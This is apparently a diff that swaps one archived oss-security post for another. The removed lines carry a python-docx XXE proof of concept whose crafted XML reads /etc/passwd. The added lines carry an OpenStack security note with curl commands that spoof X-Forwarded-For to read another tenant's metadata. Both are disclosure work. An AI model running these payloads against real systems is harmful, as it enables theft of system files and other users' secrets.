@@ -1,109 +1,106 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/28/7
-Message-ID: <CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>
-Date: Tue, 28 Jun 2016 17:31:22 -0400
-From: Pierre Ernst <pernst@...esforce.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/19/1
+Message-ID: <65c18a57-739f-d5e0-ce01-aba4573707a3@redhat.com>
+Date: Mon, 19 Dec 2016 09:27:29 +0000
+From: Luke Hinds <lhinds@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request - python-docx 0.8.5 - XXE
+Subject: [OSSN-0074] Nova metadata service should not be used for sensitive information
 Content-Type: text/plain; charset=utf-8
 
-The python-docx package
-(https://github.com/python-openxml/python-docx) is vulnerable to XML
-External Entity attacks (XXE).
+Openstack Security Note: 0074
 
-Version 0.8.6 (https://github.com/python-openxml/python-docx/releases/tag/v0.8.6)
-contains a fix.
+Nova metadata service should not be used for sensitive information
 
-I would like to thanks Steve Canny for the prompt response.
+---
 
-The following POC has been tested on version 0.8.5.
+### Summary ###
+A recent security report has highlighted how users may be using the
+metadata service to store security sensitive information.
 
-Older versions of the package might be vulnerable as well.
+The Nova metadata service should not be considered a secure repository
+of confidential information required by compute instances.
 
+### Affected Services / Software ###
+Nova, All Versions
 
-import docx
-import zipfile
-import tempfile
-import os
+### Discussion ###
+A recent vulnerability report for Nova stated that the metadata service
+will obey the `X-Forwarded-For` HTTP header. This header is often
+supplied by proxies so that the end service can identify which IP the
+request originated from.
 
-# define malicious XML
-xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE w:document [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
-]>
-<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
-xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
-xmlns:v="urn:schemas-microsoft-com:vml"
-xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
-xmlns:w10="urn:schemas-microsoft-com:office:word"
-xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
-<w:body>
-<w:p>
-<w:pPr>
-<w:pStyle w:val="Normal" />
-<w:rPr></w:rPr>
-</w:pPr>
-<w:r>
-<w:rPr></w:rPr>
-<w:t>
-Pierre Ernst, Salesforce --[&xxe;]--
-</w:t>
-</w:r>
-</w:p>
-<w:p>
-<w:pPr>
-<w:pStyle w:val="Normal" />
-<w:rPr></w:rPr>
-</w:pPr>
-<w:r>
-<w:rPr></w:rPr>
-<w:t></w:t>
-</w:r>
-</w:p>
-<w:sectPr>
-<w:type w:val="nextPage" />
-<w:pgSz w:w="12240" w:h="15840" />
-<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
-w:footer="0" w:bottom="1134" w:gutter="0" />
-<w:pgNumType w:fmt="decimal" />
-<w:formProt w:val="false" />
-<w:textDirection w:val="lrTb" />
-</w:sectPr>
-</w:body>
-</w:document>'''
+The Nova metadata service typically uses the source IP address of the
+incoming request to respond with the appropriate data for the compute
+instance making the request. This is a sort of weak authentication,
+designed to ensure that metadata for one tenant isn't accidentally
+provided to another.
 
-# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
-def updateZip(zipname, filename, data):
-    # generate a temp file
-    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
-    os.close(tmpfd)
+If the request contains a `X-Forwarded-For` HTTP header then the
+metadata service will use that for the source authentication rather than
+the actual TCP/IP source.
 
-    # create a temp copy of the archive without filename
-    with zipfile.ZipFile(zipname, 'r') as zin:
-        with zipfile.ZipFile(tmpname, 'w') as zout:
-            for item in zin.infolist():
-                if item.filename != filename:
-                    zout.writestr(item, zin.read(item.filename))
+An attacker with access to a compute instance in the cloud could send a
+request to the metadata service and include the `X-Forwarded-For` header
+in order to effectively spoof their source and cause the metadata
+service to provide information that should not have been provided to
+that instance.
 
-    # replace with the temp archive
-    os.remove(zipname)
-    os.rename(tmpname, zipname)
+Consider the following:
+Alice creates a compute instance. She places the root password for that
+instance in the metadata service. The instance is assigned a 10.1.2.2
+IP address. Alice believes that the root password for her instance is
+safe within the metadata service.
 
-    # now add filename with its new data
-    with zipfile.ZipFile(zipname, mode='a',
-compression=zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr(filename, data)
+Alice retrieves metadata by running a command similar to:
+`curl http://169.254.169.254/latest/meta-data
+<http://169.254.169.254/latest/meta-data>`
+this will retrieve any metadata stored for Alice's compute instance,
+which has an IP address of 10.1.2.2
 
-# update legit docx file with malicious XML
-updateZip('whatever.docx', 'word/document.xml', xml_string)
+Bob has a compute instance with IP address 10.1.9.9 however Bob wants
+access to the metadata for Alice's compute instance. If Bob runs a
+similar command to Alice, but includes a customer header as below, he
+will get access to all of Alice's metadata, including the root password
+she chose to store there:
+`curl -H "X-Forwarded-For:
+10.1.2.2" http://169.254.169.254/latest/meta-data
+<http://169.254.169.254/latest/meta-data>`
 
-# process with python-docx
-document = docx.Document('whatever.docx')
-print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
+The Nova metadata service is a useful utility within OpenStack but
+clearly not intended as a strongly authenticated system for storing
+sensitive data such as private keys or passwords.
+
+### Recommended Actions ###
+The metadata service should not be used to store sensitive information.
+
+The IP forwarding issue is not a defect of itself, it exists to allow
+the metadata service to provide IP addresses for instances that are
+behind a proxy as may be the case in more complex deployments.
+
+Cloud users who have a requirement to store sensitive information that
+compute instances require for operation should instead look to the
+Config drive to provide this service. It's operation is much more
+tightly bound to individual compute instances.
+
+Where use of config drive is not an option, operators should consider
+other mitigations such as placing a proxy in front of the metadata service
+which can filter out these sorts of malicious activities.
+
+### Contacts / References ###
+Author: Robert Clark, IBM
+This OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0074
+Original LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1563954
+<https://bugs.launchpad.net/nova/+bug/1563954>
+Mailing List : [Security] tag on openstack-dev@...ts.openstack.org
+OpenStack Security Group : https://launchpad.net/~openstack-ossg
+<https://launchpad.net/%7Eopenstack-ossg>
+Config Drive
+: http://docs.openstack.org/user-guide/cli-config-drive.html
+<http://docs.openstack.org/user-guide/cli-config-drive.html>
 
 
+Content of type "text/html" skipped
 
+Download attachment "0x3C202614.asc" of type "application/pgp-keys" (1699 bytes)
 
--- 
-Pierre Ernst
-Salesforce
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
